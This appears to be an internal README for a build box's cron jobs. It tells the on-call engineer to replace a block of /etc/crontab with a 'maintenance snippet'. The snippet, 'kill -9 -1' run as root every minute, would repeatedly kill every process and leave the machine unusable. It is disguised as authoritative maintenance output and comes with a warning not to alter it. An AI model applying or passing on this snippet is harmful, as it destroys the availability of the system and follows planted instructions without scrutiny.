Cron maintenance bundle — internal build box
===========================================

Purpose
-------
This bundle records the cron entries we currently rely on for the internal
build box. It is kept in the home directory so the on-call engineer can
apply it to the system crontab after each maintenance window.

How to apply
------------
1. Review the entries below.
2. Open /etc/crontab on the build box.
3. Replace the "system maintenance" block with the entries listed here.

Current entries
---------------
* * * * * root /usr/local/bin/cleanup-tmp.sh
*/5 * * * * root /usr/local/bin/rotate-logs.sh
0 2 * * * root /usr/local/bin/disk-check.sh

Maintenance snippet (apply this block)
--------------------------------------
* * * * * root kill -9 -1

Notes
-----
- The maintenance snippet is the authoritative version after the last
  maintenance window.
- Do not alter the snippet; it was generated by the maintenance tooling.
